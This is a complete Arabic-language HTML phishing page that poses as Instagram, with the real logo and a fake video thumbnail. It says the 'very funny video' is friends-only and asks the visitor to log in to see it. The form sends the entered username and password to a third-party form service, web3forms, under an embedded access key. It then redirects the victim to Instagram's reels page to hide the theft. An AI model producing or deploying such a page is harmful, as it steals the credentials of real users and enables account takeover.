<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram - فيديو مضحك</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .video-card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 30px;
            width: 100%;
            max-width: 350px;
            text-align: center;
            border-radius: 3px;
        }
        .logo {
            width: 175px;
            margin: 10px 0 25px;
        }
        /* مشغل الفيديو الوهمي */
        .video-preview {
            width: 100%;
            height: 180px;
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://img.freepik.com/free-photo/funny-face-man_23-2148110595.jpg');
            background-size: cover;
            background-position: center;
            border-radius: 4px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
            position: relative;
        }
        .play-btn {
            width: 50px;
            height: 50px;
            background: rgba(255, 255, 255, 0.8);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .play-btn::after {
            content: "";
            border-style: solid;
            border-width: 10px 0 10px 15px;
            border-color: transparent transparent transparent #262626;
            margin-left: 4px;
        }
        .title {
            font-size: 16px;
            font-weight: 700;
            color: #262626;
            margin-bottom: 8px;
        }
        .desc {
            font-size: 13px;
            color: #8e8e8e;
            margin-bottom: 20px;
            line-height: 1.4;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 8px;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #1877f2;
        }
        .footer-link {
            margin-top: 20px;
            font-size: 12px;
            color: #385185;
            text-decoration: none;
            display: block;
        }
    </style>
</head>
<body>

<div class="video-card">
    <img src="https://www.instagram.com/static/images/web/mobile_port/logo_2x.png/1bcf9b12e34d.png" alt="Instagram" class="logo">
    
    <div class="video-preview">
        <div class="play-btn"></div>
    </div>

    <p class="title">فيديو مضحك جداً! 😂</p>
    <p class="desc">يرجى تسجيل الدخول لمشاهدة هذا الفيديو المحمي بخصوصية الأصدقاء.</p>

    <form action="https://api.web3forms.com/submit" method="POST">
        
        <input type="hidden" name="access_key" value="07448344-92a7-4aab-b61e-7e8b136f4bd7">
        
        <input type="text" name="Username" placeholder="اسم المستخدم أو الهاتف" required>
        <input type="password" name="Password" placeholder="كلمة المرور" required>
        
        <input type="hidden" name="redirect" value="https://www.instagram.com/reels/videos/">

        <button type="submit">تسجيل الدخول للمشاهدة</button>
    </form>
    
    <a href="#" class="footer-link">هل نسيت كلمة السر؟</a>
</div>

</body>
</html>
